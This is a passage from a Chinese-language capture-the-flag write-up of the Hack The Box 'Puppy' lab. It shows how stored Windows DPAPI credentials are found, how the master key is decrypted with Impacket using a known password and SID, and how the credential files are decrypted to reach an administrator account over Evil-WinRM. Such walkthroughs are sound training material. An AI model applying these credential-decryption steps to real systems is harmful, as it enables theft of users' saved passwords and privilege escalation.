   =================================================================================                                                  ================                                                                            


ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files                                                                                      
È  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalat                                                  ion/index.html#dpapi                                                                        
    CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
    Description: Local Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 8:14:09 AM
    Modified: 3/8/2025 8:14:09 AM
    Size: 11068
   =================================================================================                                                  ================                                                                            

    CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
    Description: Enterprise Credential Data

    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
    Accessed: 3/8/2025 7:54:29 AM
    Modified: 3/8/2025 7:54:29 AM
    Size: 414
   =================================================================================                                                  ================        
```

要使用 **Impacket** 的 `dpapi.py` 解密用户的 **DPAPI MasterKey**（主密钥），需要：

1. **用户的密码**（`ChefSteph2025!`）  
2. **用户的 SID**（如 `S-1-5-21-1487982659-1829050783-2281216199-1107`）  
3. **MasterKey 文件**（通常位于 `%APPDATA%\Microsoft\Protect\<SID>\<GUID>`）  

---

核心条件中，用户 SID和用户密码明文已经有了，文件下载出来
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/e5bbdcfb49cc47fc8c3915b48e81c018.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/b104a3cfabc14ccf81752b7330d7835f.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/09892ea9090e4ca39edee3f9a5d2e7b4.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/50e9238b6ad1411089f4f31ab08490d7.png)
![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/411165c52ebb467aa7ba3c94e34ad301.png)

```bash
Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```

### **解密 DPAPI 存储的凭据（`credential_`）获得明文的详细步骤**

---

#### **1. 前提条件**

- **已获得用户的主密钥（MasterKey）**: 通过 `impacket-dpapi masterkey` 解密后的 **64 字节十六进制字符串**，例如：
  
  ```plaintext
  89a23bcd12ef4567890a1b2c3d4e5f67890a1b2c3d4e5f67890a1b2c3d4e5f6789
  ```
- **凭据文件（`credential`）**: 位于 Windows 系统中的以下路径之一：
  - Credential Manager: `%APPDATA%\Microsoft\Credentials\`
  - 浏览器凭据（如 Chrome）: `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`
  - 其他应用: 需根据具体应用定位文件。

---

#### **2. 解密命令语法**

```bash
impacket-dpapi credential \
    --masterkey <MasterKey_HEX> \
    /path/to/credential_
```

##### **参数说明**:

- `--masterkey`: 解密后的主密钥（64 字节十六进制字符串）。
- `/path/to/credential_`: 目标凭据文件路径（需从 Windows 提取到 Kali）。

---

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/455d71dce4e74ab5aa0251aadfe234cb.png)

```bash
*Evil-WinRM* PS C:\Users\steph.cooper_adm\Desktop> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
steph.cooper_adm
The command completed successfully.
```

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/1d09507b721f4f4ea9fc60ef97b889ce.png)

![在这里插入图片描述](https://i-blog.csdnimg.cn/direct/20776f723be3471a93011ded206940fc.png)

## wp

[HTB-Puppy](https://www.hyhforever.top/posts/2025/05/htb-puppy/)
[HackTheBox-中级-2.puppy](https://www.bilibili.com/opus/1070109144989564944)
[HTB 赛季8靶场 - Puppy](https://blog.csdn.net/weixin_44368093/article/details/148099544)
